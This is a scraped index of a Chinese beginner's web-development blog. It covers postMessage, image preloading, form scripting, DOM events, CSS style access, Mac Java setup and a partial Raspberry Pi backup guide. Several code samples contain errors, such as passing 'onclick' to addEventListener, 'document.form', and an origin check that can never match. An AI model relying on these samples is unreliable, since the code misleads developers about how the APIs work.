API，其中有一个就是跨文档消息传递（cross-document-messaging简称XDM）。 现在XDM已经作为一个规范独立了出来，名字为：Web Messaging 项目地址为：http://dev.w3.org/html5/postmsg/ XMD核心就是postMessage()方法，这个方法接受两个参数一个是需要传送的字符串，第二个是接收方的域的字符串。 第二个参数可以控制一定的安全性，如果把第二个参数设置为\u0026quot;*\u0026quot;，那么就是所有的域都可以接收此消息。 而相对于postMessage()方法的其他页面指的就是包含在当前页面中的元素或者是由当前窗口弹出的窗口。如下列中首先创建一个iframe内嵌框架，获取iframe元素window对象的引用(所有支持XDM的浏览器都支持iframe的contentWindow属性)，然后进行消息传递。\n1 var newIframe = document.createElement(\u0026#34;iframe\u0026#34;); 2 3 newIframe.src = \u0026#34;http://www.baidu.com/\u0026#34;; 4 5 newIframe.width = \u0026#34;500px\u0026#34;; 6 7 newIframe.height = \u0026#34;500px\u0026#34;; 8 9 document.body.appendChild(newIframe); 10 11 var iframeWindow = newIframe.contentWindow; 12 13 iframeWindow.postMessage(\u0026#34;this is post mess\u0026#34;, \u0026#34;http://www.baidu.com\u0026#34;); //传递信息成功 传递过后会触发接收方window对象的message事件，在message事件对象中包含三个息息相关重要的属性：\ndata：里面包含由postMessage()方法传递过来的第一个参数信息，也就是传递的消息，为字符串形式 origin：发送消息的方的域，字符串形式如：“http://www.baidu.com” source：发送消息方的window对象代理，这个代理主要用于在接收到消息过后然后反馈给发送方消息，调用方式同样为：event.source.postMessage(\u0026ldquo;已收到消息\u0026rdquo;,\u0026ldquo;http://www.baidu.com\u0026rdquo;)，但是它不能用于访问发送方文档信息。 用上面的例子来做演示：\n1 var newIframe = document.createElement(\u0026#34;iframe\u0026#34;); 2 3 newIframe.src = \u0026#34;http://www.baidu.com/\u0026#34;; 4 5 newIframe.width = \u0026#34;500px\u0026#34;; 6 7 newIframe.height = \u0026#34;500px\u0026#34;; 8 9 document.body.appendChild(newIframe); 10 11 var iframeWindow = newIframe.contentWindow; 12 13 //定义接收方window对象的message事件 14 iframeWindow.addEventListener(\u0026#34;message\u0026#34;, function(event) { 15 16 //检查是否为安全域 17 if(event.origin == \u0026#34;http://www.baidu.com/\u0026#34;) { 18 19 //弹出 “this is post mess” 20 alert(event.data); 21 22 //获取发送方的window代理并返回消息。域为baidu.com 23 event.source.postMessage(\u0026#34;已收到消息，反馈\u0026#34;,\u0026#34;http://www.baidu.com/\u0026#34;) 24 25 }; 26 27 }, false); 28 29 //定义发送方window对象的message事件 30 window.addEventListener(\u0026#34;message\u0026#34;, function(event) { 31 32 //检查是否为安全域 33 if(event.origin == \u0026#34;http://www.baidu.com/\u0026#34;){ 34 35 //弹出“已收到消息，反馈” 36 alert(event.data); 37 }; 38 39 }, false); 40 41 //传递信息成功 42 iframeWindow.postMessage(\u0026#34;this is post mess\u0026#34;,\u0026#34;http://www.baidu.com\u0026#34;); 43 ","permalink":"/posts/html5-cross-documents-send-messages/","summary":"HTML5定义了一些javascript API，其中有一个就是跨文档消息传递（cross-document-messaging简称XDM）。 现在XDM已经作为一个规范独立了出来，名字为：Web Messaging 项目地址为：http://dev.w3.org/html5/postmsg/ XMD核心就是postMessage()方法，这个方法接受两个参数一个是需要传送的字符串，第二个是接收方的域的字符串。 第二个参数可以控制一定的安全性，如果把第二个参数设置为\u0026quot;*\u0026quot;，那么就是所有的域都可以接收此消息。 而相对于postMessage()方法的其他页面指的就是包含在当前页面中的元素或者是由当前窗口弹出的窗口。如下列中首先创建一个iframe内嵌框架，获取iframe元素window对象的引用(所有支持XDM的浏览器都支持iframe的contentWindow属性)，然后进行消息传递。\n1 var newIframe = document.createElement(\u0026#34;iframe\u0026#34;); 2 3 newIframe.src = \u0026#34;http://www.baidu.com/\u0026#34;; 4 5 newIframe.width = \u0026#34;500px\u0026#34;; 6 7 newIframe.height = \u0026#34;500px\u0026#34;; 8 9 document.body.appendChild(newIframe); 10 11 var iframeWindow = newIframe.contentWindow; 12 13 iframeWindow.postMessage(\u0026#34;this is post mess\u0026#34;, \u0026#34;http://www.baidu.com\u0026#34;); //传递信息成功 传递过后会触发接收方window对象的message事件，在message事件对象中包含三个息息相关重要的属性：\ndata：里面包含由postMessage()方法传递过来的第一个参数信息，也就是传递的消息，为字符串形式 origin：发送消息的方的域，字符串形式如：“http://www.baidu.com” source：发送消息方的window对象代理，这个代理主要用于在接收到消息过后然后反馈给发送方消息，调用方式同样为：event.source.postMessage(\u0026ldquo;已收到消息\u0026rdquo;,\u0026ldquo;http://www.baidu.com\u0026rdquo;)，但是它不能用于访问发送方文档信息。 用上面的例子来做演示：\n1 var newIframe = document.createElement(\u0026#34;iframe\u0026#34;); 2 3 newIframe.src = \u0026#34;http://www.baidu.com/\u0026#34;; 4 5 newIframe.width = \u0026#34;500px\u0026#34;; 6 7 newIframe.height = \u0026#34;500px\u0026#34;; 8 9 document.","title":"HTML5跨文档消息传递"},{"content":"这个是我在复习书籍的时候看见的，当时一个同学想通过页面发送请求，但是数据量不是太大，所以用的get方式，但是页面用表单提交请求的话会让页面进行跳转，当时我在网上查了一点资料，发现基本上都是通过ajax请求，无奈现在还没有学习到ajax这一部分，于是翻书，正好看到这里了。所以后面的代码改了过后，一句话解决了问题。\n1 var chunk = 数据; var url = \u0026#34;http://www.baidu.com\u0026#34;; document.createElement(\u0026#34;img\u0026#34;).src = url + \u0026#34;\u0026amp;\u0026#34; + chunk; 在Javascript中对于图片格式进行了实现类型为HTMLImageElement继承自HTMLElement，这个类型拥有img标签公有的特性名对应的属性，可以通过这些属性进行设置。 HTMLImageElement类型是一个动态的类型，也就是说不添加进DOM树中还是能够加载，这个过程我把它叫做\u0026quot;预加载\u0026quot;，如下：\n1 var nimg = document.createElement(\u0026#34;img\u0026#34;); nimg.src = \u0026#34;http://www.baidu.com/img/baidu\\_jgylogo3.gif\u0026#34;; //当执行到这一条语句的时候，此时它就会预加载，即使你没有添加进DOM树中，没有添加进DOM树只是你看不见。 如何来验证这个问题？我通过添加load事件来监听是否加载完成，如果加载完成则弹窗，这里我把顺序分成在监听前设置src属性，和监听后设置src属性。 第一种方式：先设置src属性后监听\n1 var nimg = document.createElement(\u0026#34;img\u0026#34;); nimg.src = \u0026#34;http://www.baidu.com/img/baidu\\_jgylogo3.gif\u0026#34;; 2 //这里并没有弹窗 3 4 nimg.addEventListener(\u0026#34;load\u0026#34;,function(){alert(1)},false); document.body.appendChild(nimg); 5 //即使我添加进DOM树还是没有弹窗 第二种方式：先监听后设置src属性\n1 var nimg = document.createElement(\u0026#34;img\u0026#34;); 2 3 nimg.addEventListener(\u0026#34;load\u0026#34;,function(){alert(1)},false); 4 5 nimg.src = \u0026#34;http://www.baidu.com/img/baidu\\_jgylogo3.gif\u0026#34;; 6 //执行到这里的时候会弹窗，说明监听到事件。 ","permalink":"/posts/htmlimageelements/","summary":"这个是我在复习书籍的时候看见的，当时一个同学想通过页面发送请求，但是数据量不是太大，所以用的get方式，但是页面用表单提交请求的话会让页面进行跳转，当时我在网上查了一点资料，发现基本上都是通过ajax请求，无奈现在还没有学习到ajax这一部分，于是翻书，正好看到这里了。所以后面的代码改了过后，一句话解决了问题。\n1 var chunk = 数据; var url = \u0026#34;http://www.baidu.com\u0026#34;; document.createElement(\u0026#34;img\u0026#34;).src = url + \u0026#34;\u0026amp;\u0026#34; + chunk; 在Javascript中对于图片格式进行了实现类型为HTMLImageElement继承自HTMLElement，这个类型拥有img标签公有的特性名对应的属性，可以通过这些属性进行设置。 HTMLImageElement类型是一个动态的类型，也就是说不添加进DOM树中还是能够加载，这个过程我把它叫做\u0026quot;预加载\u0026quot;，如下：\n1 var nimg = document.createElement(\u0026#34;img\u0026#34;); nimg.src = \u0026#34;http://www.baidu.com/img/baidu\\_jgylogo3.gif\u0026#34;; //当执行到这一条语句的时候，此时它就会预加载，即使你没有添加进DOM树中，没有添加进DOM树只是你看不见。 如何来验证这个问题？我通过添加load事件来监听是否加载完成，如果加载完成则弹窗，这里我把顺序分成在监听前设置src属性，和监听后设置src属性。 第一种方式：先设置src属性后监听\n1 var nimg = document.createElement(\u0026#34;img\u0026#34;); nimg.src = \u0026#34;http://www.baidu.com/img/baidu\\_jgylogo3.gif\u0026#34;; 2 //这里并没有弹窗 3 4 nimg.addEventListener(\u0026#34;load\u0026#34;,function(){alert(1)},false); document.body.appendChild(nimg); 5 //即使我添加进DOM树还是没有弹窗 第二种方式：先监听后设置src属性\n1 var nimg = document.createElement(\u0026#34;img\u0026#34;); 2 3 nimg.addEventListener(\u0026#34;load\u0026#34;,function(){alert(1)},false); 4 5 nimg.src = \u0026#34;http://www.baidu.com/img/baidu\\_jgylogo3.gif\u0026#34;; 6 //执行到这里的时候会弹窗，说明监听到事件。 ","title":"HTMLImageElement类型的简便利用"},{"content":"在HTML中，表单由标签构成。在javascript中，是由HTMLFormElement类型构成，这个类型继承自HTMLElement类型。\nHTMLFormElement类型具有以下单独的属性和方法：\nacceptCharset: 服务器能够处理的字符集（HTML中的accept-charset） action：请求的URL地址（HTML中的action） method：请求的http类型，是为POST还是为GET（HTML中的method） elements：表单里的所有组件的集合，类型为HTMLCollection length：表单里所有组件的数量 enctype：请求编码的类型（HTML中的enctype） name：表单的名称（HTML中表单的name） submit()：用编程方式提交表单 reset()：将表单里所有可填写的组件内容置空 target：用于发送请求和接收响应的窗口名字（HTML中的target） document.form属性 可以通过document.form来获取整个页面的form表单，返回一个集合，可以通过数值的索引活着name值来查找特定的表单：\nvar oneform = document.form[0];\nvar twoform = document.form[twoform];\nelements属性 每个表单都会有一个elements属性，里面包含了表单内所有组件的集合，它是一个有序的列表，里面包含了按顺序的组件索引，可以通过数值索引和name值来访问里面的组件。\nvar oneform = document.form[0];\nvar oneinput = oneform.elements[0];\nsubmit()、reset() 可以通过编程方式提交表单，在表单的引用上调用submit()方法可以提交表单，但是不触发submit事件。相对于reset()方法，可以通过调用执行置空，但是它会触发reset事件。\nfocus()、blur()方法 focus()方法用户将浏览器的焦点设置到当前表单组件，而blur()方法则是将当前表单组件的焦点移开。\n表单字段事件 blur：当组件失去焦点的时候触发事件 change：值产生变化的时候触发事件 focus：当组件获得焦点的时候触发事件 select()方法、select选择事件、selectionStart、selectionEnd 在和文本框的引用上调用此方法可以选择文本框的全部内容。\nvar inp = document.getElementsByTagName(\u0026ldquo;input\u0026rdquo;)[0];\ninput.addEventListener(\u0026ldquo;focus\u0026rdquo;,function(event){\nevent.target.select();\n},false);select事件，当发生选择文本或者select()方法的时候发生\nvar inp = document.getElementsByTagName(\u0026ldquo;input\u0026rdquo;)[0];\ninput.addEventListener(\u0026ldquo;select\u0026rdquo;,function(event){\nalert(this.type);\n},false); selectionStart属性和selectionEnd属性表示在文本框里面选择的文本开始位置和结束位置。\nvar area123 = document.getElementsByTagName(\u0026ldquo;area\u0026rdquo;)[0];\narea123.value.substring(area123.selectionStart,area123.selectionEnd);substring()方法是基于字符串偏移量执行的操作。所以这里直接给这两个值可以获得文本。\n剪贴板事件 HTML5把剪贴板事件纳入了规范，纳入规范的几个事件为：\nbeforecopy：在发生复制操作前发触发 copy：在发生复制操作时触发 beforecut：在发生剪切操作前触发 cut：在发生剪切时出发 beforepaste：在发生粘贴操作前触发 paste：在发生粘贴时触发 Safari、chrome、firefox浏览器在三个操作前发生事件表现在针对文本框的上下文菜单中，而ie则是在触发copy、cut、paste事件前触发其他三个事件。\nclipboardData对象 访问剪贴板中的数据可以访问clipboardData对象，此对象在ie中是window的属性，而在Safari、chrome、firefox中是在当前事件对象event的属性。\n此对象有三个方法分别为：\ngetData() setData() clearData() getData()方法在接受一个参数，在ie中接受一个参数（数据格式），有两种数据格式\u0026quot;text\u0026quot;,\u0026ldquo;url\u0026rdquo;，在Safari、chrome、firefox中接受的参数为MIME类型，text类型表示为\u0026quot;text/plain\u0026quot;。\nsetData()方法接受两个参数，一个是数据格式(ie和Safari、chrome、firefox不一样)，一个是要放在剪贴板的文字。如果成功返回true反之为false。\nclearData()方法不需要参数，执行过后清空剪贴板里的内容。\nHTML5约束验证API required属性\n在表单组件中添加一个required属性，就可以让支持html5的浏览器让此组件不能为空。\nstepDown()\n接受一个参数，既在调用的组件上的数值减去传递的数值\ndocument.getElementById(\u0026ldquo;kname\u0026rdquo;).stepDown(5);stepUp()\n接受一个参数，既在调用的组件上的数值加上传递的数值\ndocument.getElementById(\u0026ldquo;kname\u0026rdquo;).stepUp(5);pattern属性\npattern属性的值是一个正则表达式，用于匹配文本框中的值。如果只想输入数值，那么可以这样：\ncheckValidity()方法\ncheckValidity()方法可以检测整个表单是否的组件值是否有效，有效则返回true反之为false。\n还可以在组件本身调用checkValidity()方法，如果组件的内容有效则返回true反之false。\nvalidity属性\nvalidity属性可以想象成是checkvalidity()方法的增强版，它里面提供了很多详细信息，比如说为什么无效。它里面包含了一些属性，每个属性都返回一个布尔值。\ncustomError：如果设置了setCustomValidity()返回true反之为false pattenrnMismatch：如果值与指定的pattern属性不匹配，返回true。 rangeOverflow：如果值比max值大，返回true rangeUnderflow：如果值比min小，返回true stepMisMatch：如果min和max之间的步长值不合理，返回true tooLong：如果值的长度超过了maxlength属性制定的长度，返回true typeMismatch：如果值不是\u0026quot;mail\u0026quot;或\u0026quot;url\u0026quot;要求的格式，返回true valid：如果这里的其他属性为false。它就返回true valueMissing：如果标注了为required属性的组件中没有值，那么返回true novalidate属性\n此属性可以告诉表单不验证，即使是空的也不会进行验证。\n","permalink":"/posts/html-from/","summary":"在HTML中，表单由标签构成。在javascript中，是由HTMLFormElement类型构成，这个类型继承自HTMLElement类型。\nHTMLFormElement类型具有以下单独的属性和方法：\nacceptCharset: 服务器能够处理的字符集（HTML中的accept-charset） action：请求的URL地址（HTML中的action） method：请求的http类型，是为POST还是为GET（HTML中的method） elements：表单里的所有组件的集合，类型为HTMLCollection length：表单里所有组件的数量 enctype：请求编码的类型（HTML中的enctype） name：表单的名称（HTML中表单的name） submit()：用编程方式提交表单 reset()：将表单里所有可填写的组件内容置空 target：用于发送请求和接收响应的窗口名字（HTML中的target） document.form属性 可以通过document.form来获取整个页面的form表单，返回一个集合，可以通过数值的索引活着name值来查找特定的表单：\nvar oneform = document.form[0];\nvar twoform = document.form[twoform];\nelements属性 每个表单都会有一个elements属性，里面包含了表单内所有组件的集合，它是一个有序的列表，里面包含了按顺序的组件索引，可以通过数值索引和name值来访问里面的组件。\nvar oneform = document.form[0];\nvar oneinput = oneform.elements[0];\nsubmit()、reset() 可以通过编程方式提交表单，在表单的引用上调用submit()方法可以提交表单，但是不触发submit事件。相对于reset()方法，可以通过调用执行置空，但是它会触发reset事件。\nfocus()、blur()方法 focus()方法用户将浏览器的焦点设置到当前表单组件，而blur()方法则是将当前表单组件的焦点移开。\n表单字段事件 blur：当组件失去焦点的时候触发事件 change：值产生变化的时候触发事件 focus：当组件获得焦点的时候触发事件 select()方法、select选择事件、selectionStart、selectionEnd 在和文本框的引用上调用此方法可以选择文本框的全部内容。\nvar inp = document.getElementsByTagName(\u0026ldquo;input\u0026rdquo;)[0];\ninput.addEventListener(\u0026ldquo;focus\u0026rdquo;,function(event){\nevent.target.select();\n},false);select事件，当发生选择文本或者select()方法的时候发生\nvar inp = document.getElementsByTagName(\u0026ldquo;input\u0026rdquo;)[0];\ninput.addEventListener(\u0026ldquo;select\u0026rdquo;,function(event){\nalert(this.type);\n},false); selectionStart属性和selectionEnd属性表示在文本框里面选择的文本开始位置和结束位置。\nvar area123 = document.getElementsByTagName(\u0026ldquo;area\u0026rdquo;)[0];\narea123.value.substring(area123.selectionStart,area123.selectionEnd);substring()方法是基于字符串偏移量执行的操作。所以这里直接给这两个值可以获得文本。\n剪贴板事件 HTML5把剪贴板事件纳入了规范，纳入规范的几个事件为：\nbeforecopy：在发生复制操作前发触发 copy：在发生复制操作时触发 beforecut：在发生剪切操作前触发 cut：在发生剪切时出发 beforepaste：在发生粘贴操作前触发 paste：在发生粘贴时触发 Safari、chrome、firefox浏览器在三个操作前发生事件表现在针对文本框的上下文菜单中，而ie则是在触发copy、cut、paste事件前触发其他三个事件。","title":"HTML表单脚本"},{"content":"Javascript与html之间的交互是通过事件进行交互。事件是通过侦听器（交互处理程序）来预定执行的。 页面中哪部分会拥有某个特点的事件？当你点击页面中的任何一个元素，其实就是点击了整个页面，用书上的例子来说： 当你画一个同心圆的时候，把手指放在圆心，你手指指向的不单单是一个圆，而是全部的圆。\n事件流 事件流指的是页面中接收事件的顺序，DOM2级事件规定事件流包括三个步骤，分别为：\n1.捕获阶段 捕获阶段是为了截获事件提供机会\n2.处于目标阶段 这个阶段表示目标接收到事件\n3.冒泡阶段 这个阶段可以对事件做出响应\n事件处理程序 事件指的是比如单击(click)、双击(dbclick)、鼠标移动(mouseover)、键盘按键(keydownkeyup)等都属于事件，那事件处理程序就是处理事件发生时候执行的一个程序。而在html中会有一个和事件处理程序名字对应的一个属性。\nDOM0级事件处理程序 DOM0级事件处理程序是通过javascript代码取得一个元素的引用然后把一个函数赋值给对应的事件处理程序属性。这样方式添加的事件处理程序会在事件流中的冒泡阶段被处理。\n1 var newimg = document.getElementsByTagName(\u0026#34;img\u0026#34;)\\[0\\]; 2 3 newimg.onlick = function(){alert(1)}; DOM2级事件处理程序 DOM2级事件添加了两个专门处理事件的方法，所有的DOM节点都包含了这两个方法。分别为: addEventListener() 这个方法用于添加DOM事件，在所有DOM节点上都可以调用此方法，此方法接收三个参数分别为事件名称、处理程序和布尔值（为true则在捕获阶段调用事件处理程序，为false在冒泡阶段调用事件处理程序）\n1 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 2 body.addEventListener(\u0026#34;onclick\u0026#34;,function(){alert(1)},true); removeEventListener() 这个方法和addEventListener()方法相反，是删除相应的事件，同样接收三个参数，这三个参数完全和addEventListener() 一样。\n1 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 2 function handles(){alert(1)}; body.addEventListener(\u0026#34;onclick\u0026#34;,handles,true); 3 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 4 body.removeEventListener(\u0026#34;onclick\u0026#34;,handles,true); 注意这里没有直接添加匿名函数而是用function创建了一个函数，removeEventListener()方法是无法删除匿名函数，就算你传入进去的匿名函数和添加的匿名函数完全一样还是不能删除，所以这里注意。\n事件对象 当事件触发的时候，事件会产生一个事件对象event,这个对象里面包含了当前触发事件的一些相关信息。这个对象DOM0级和DOM2级的都支持，也就是说只要兼容DOM的浏览器都会有这样的一个对象。\n1 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 2 3 function handles(event){alert(event.type)}; 4 5 body.addEventListener(\u0026#34;onclick\u0026#34;,handles,true); //输出click event对象的属性：\n1、bubbles 返回布尔值，指示事件是否是起泡事件类型。\n2、cancelable 返回布尔值，指示事件是否可拥可取消的默认动作。\n3、currentTarget 返回其事件监听器触发该事件的元素。\n4、eventPhase 返回事件传播的当前阶段。\n5、target 返回触发此事件的元素（事件的目标节点）。\n6、timeStamp 返回事件生成的日期和时间。\n7、type 返回当前 Event 对象表示的事件的名称。\nevent对象的方法：\n1、initEvent() 初始化新创建的 Event 对象的属性。\n2、preventDefault() 通知浏览器不要执行与事件关联的默认动作。\n3、stopPropagation() 不再派发事件。\n","permalink":"/posts/javascript-dom-event/","summary":"Javascript与html之间的交互是通过事件进行交互。事件是通过侦听器（交互处理程序）来预定执行的。 页面中哪部分会拥有某个特点的事件？当你点击页面中的任何一个元素，其实就是点击了整个页面，用书上的例子来说： 当你画一个同心圆的时候，把手指放在圆心，你手指指向的不单单是一个圆，而是全部的圆。\n事件流 事件流指的是页面中接收事件的顺序，DOM2级事件规定事件流包括三个步骤，分别为：\n1.捕获阶段 捕获阶段是为了截获事件提供机会\n2.处于目标阶段 这个阶段表示目标接收到事件\n3.冒泡阶段 这个阶段可以对事件做出响应\n事件处理程序 事件指的是比如单击(click)、双击(dbclick)、鼠标移动(mouseover)、键盘按键(keydownkeyup)等都属于事件，那事件处理程序就是处理事件发生时候执行的一个程序。而在html中会有一个和事件处理程序名字对应的一个属性。\nDOM0级事件处理程序 DOM0级事件处理程序是通过javascript代码取得一个元素的引用然后把一个函数赋值给对应的事件处理程序属性。这样方式添加的事件处理程序会在事件流中的冒泡阶段被处理。\n1 var newimg = document.getElementsByTagName(\u0026#34;img\u0026#34;)\\[0\\]; 2 3 newimg.onlick = function(){alert(1)}; DOM2级事件处理程序 DOM2级事件添加了两个专门处理事件的方法，所有的DOM节点都包含了这两个方法。分别为: addEventListener() 这个方法用于添加DOM事件，在所有DOM节点上都可以调用此方法，此方法接收三个参数分别为事件名称、处理程序和布尔值（为true则在捕获阶段调用事件处理程序，为false在冒泡阶段调用事件处理程序）\n1 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 2 body.addEventListener(\u0026#34;onclick\u0026#34;,function(){alert(1)},true); removeEventListener() 这个方法和addEventListener()方法相反，是删除相应的事件，同样接收三个参数，这三个参数完全和addEventListener() 一样。\n1 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 2 function handles(){alert(1)}; body.addEventListener(\u0026#34;onclick\u0026#34;,handles,true); 3 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 4 body.removeEventListener(\u0026#34;onclick\u0026#34;,handles,true); 注意这里没有直接添加匿名函数而是用function创建了一个函数，removeEventListener()方法是无法删除匿名函数，就算你传入进去的匿名函数和添加的匿名函数完全一样还是不能删除，所以这里注意。\n事件对象 当事件触发的时候，事件会产生一个事件对象event,这个对象里面包含了当前触发事件的一些相关信息。这个对象DOM0级和DOM2级的都支持，也就是说只要兼容DOM的浏览器都会有这样的一个对象。\n1 var body = document.getElementsByTagName(\u0026#34;body\u0026#34;); 2 3 function handles(event){alert(event.type)}; 4 5 body.addEventListener(\u0026#34;onclick\u0026#34;,handles,true); //输出click event对象的属性：","title":"JavascriptDOM事件"},{"content":"DOM2级样式为style对象定义了一些属性和方法，可以通过这些方法属性来访问或者修改元素的样式信息：\n1、cssText：可读写，在读的情况下以字符串形式返回元素的css代码，在写的情况下以字符串形式重写整个元素的css代码\n2、length：返回当前元素应用的css属性数量。\n3、parentRule：返回表示css信息的CSSRule对象\n4、getPropertyCSSValue(propertyName)：返回给定样式属性的CSSValue类型值\n5、getPropertyPriority(propertyName)：如果当前给定的样式属性使用了!important，则返回”important”，反之返回空字符串\n6、getPropertyValue(propertyNamee)：以字符串形式返回给定属性的值 item(index)：返回给定位置的CSS属性的名称\n7、removeProperty(propertyName)：删除给定属性\n8、setProperty(propertyName, value,priority)：将给定的属性设置相应的值，如果需要表示优先，那么在priority位置添加important字符串\n在DOM2级中为style对象定义的方法和属性是无法获取到从其他样式叠层应用的样式信息，DOM2级样式增强 document.defaultView，提供了getComputedStyle计算方法。这个方法接受两个参数，要计算的元素和一个伪元素字符串(如：”:after”)。这个方法可以获取任何通过叠层应用来的样式信息。但是返回的任何结果只能读不能写，因为这些信息是已经计算的结果。 IE不支持getComputedStyle()方法，但是IE有一个类似的方法实现的，这个方法定义在IE浏览器style对象里面的currentStyle属性。这个属性放回一个包含当前元素全部计算过后的样式信息。\n","permalink":"/posts/javascript-get-css/","summary":"DOM2级样式为style对象定义了一些属性和方法，可以通过这些方法属性来访问或者修改元素的样式信息：\n1、cssText：可读写，在读的情况下以字符串形式返回元素的css代码，在写的情况下以字符串形式重写整个元素的css代码\n2、length：返回当前元素应用的css属性数量。\n3、parentRule：返回表示css信息的CSSRule对象\n4、getPropertyCSSValue(propertyName)：返回给定样式属性的CSSValue类型值\n5、getPropertyPriority(propertyName)：如果当前给定的样式属性使用了!important，则返回”important”，反之返回空字符串\n6、getPropertyValue(propertyNamee)：以字符串形式返回给定属性的值 item(index)：返回给定位置的CSS属性的名称\n7、removeProperty(propertyName)：删除给定属性\n8、setProperty(propertyName, value,priority)：将给定的属性设置相应的值，如果需要表示优先，那么在priority位置添加important字符串\n在DOM2级中为style对象定义的方法和属性是无法获取到从其他样式叠层应用的样式信息，DOM2级样式增强 document.defaultView，提供了getComputedStyle计算方法。这个方法接受两个参数，要计算的元素和一个伪元素字符串(如：”:after”)。这个方法可以获取任何通过叠层应用来的样式信息。但是返回的任何结果只能读不能写，因为这些信息是已经计算的结果。 IE不支持getComputedStyle()方法，但是IE有一个类似的方法实现的，这个方法定义在IE浏览器style对象里面的currentStyle属性。这个属性放回一个包含当前元素全部计算过后的样式信息。","title":"Javascript访问css样式信息"},{"content":"今天在安装Elicpse IDE的时候，发现提示安装的Java版本不支持，于是在官方去下载了Jre最新版本并安装，在安装完过后再次打开Elicpse发现提示还是不正确，如果用Google查询到一些资料，并且得到了解决 首先需要到JDK官方网站去下载你需要安装的版本\n地址为：http://www.java.com/en/download/faq/develop.xml\n在终端下进入系统设置的默认目录\n1 /System/Library/Frameworks/JavaVM.framework/Versions/ 删除老版本的链接文件并建立新版本的链接文件\n1 ln -s /Library/Java/JavaVirtualMachines/选择要设置默认的版本/Contents/ CurrentJDK ","permalink":"/posts/mac-java-version/","summary":"今天在安装Elicpse IDE的时候，发现提示安装的Java版本不支持，于是在官方去下载了Jre最新版本并安装，在安装完过后再次打开Elicpse发现提示还是不正确，如果用Google查询到一些资料，并且得到了解决 首先需要到JDK官方网站去下载你需要安装的版本\n地址为：http://www.java.com/en/download/faq/develop.xml\n在终端下进入系统设置的默认目录\n1 /System/Library/Frameworks/JavaVM.framework/Versions/ 删除老版本的链接文件并建立新版本的链接文件\n1 ln -s /Library/Java/JavaVirtualMachines/选择要设置默认的版本/Contents/ CurrentJDK ","title":"Mac下修改默认的Java版本"},{"content":"最近一段时间感觉用移动硬盘备份Mac电脑很不方便，因为要把移动硬盘拿出来，还要插上电脑备份，看了一下AirPort，但是价钱太贵，况且只能用于Mac备份并不能用于其他的Samba服务等，感觉不太划算，于是打算自己做一个TimeMacheine以及samba服务，TimeMacheine服务主要用于Mac备份，而samba用于局域网内的电脑上的一些文件存放。\n准备工作： 1、树莓派\n2、移动硬盘\n3、5V电源适配器以及连接线\n4、无线USB网卡或者有线\n5、SD卡（新版本的是TF卡）\n6、操作系统，关于操作系统，你可以到raspberry官方网站进行下载并通过win32diskimager软件进行写入。\n在这里我自己的设备信息为： 1、树莓派2代\n2、西数移动硬盘2TB自带电源\n3、5V电源适配器以及连接线\n4、有线网络\n5、SD卡16GB金士顿\n6、raspbian操作系统\n查看自己的移动硬盘是否加载，lsblk结果： 1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 在这里我是把我的硬盘分为两个分区，/dev/sda1 为ntfs格式、/dev/sda2 为 hfs格式，如果你需要进行分区可以通过fdisk以及cfdisk进行分区。\n格式化分区： 1 mkfs.ntfs -v “samba” /dev/sda1 \u0026amp;\u0026amp; mkfs.hfsplus -v “timemacheine” /dev/sda2 准备timemacheine以及samba的挂载目录：\n1 mkdir /srv/samba mkdir /srv/timemacheine samba搭建 安装ntfs-3g，让raspberry支持ntfs格式\n1 apt-get install ntfs-3g 挂载分区到指定目录\n1 mount -t ntfs /dev/sda1 /srv/samba 查看是否成功挂载，lsblk结果：\n1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part /src/samba (已挂载成功) `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span 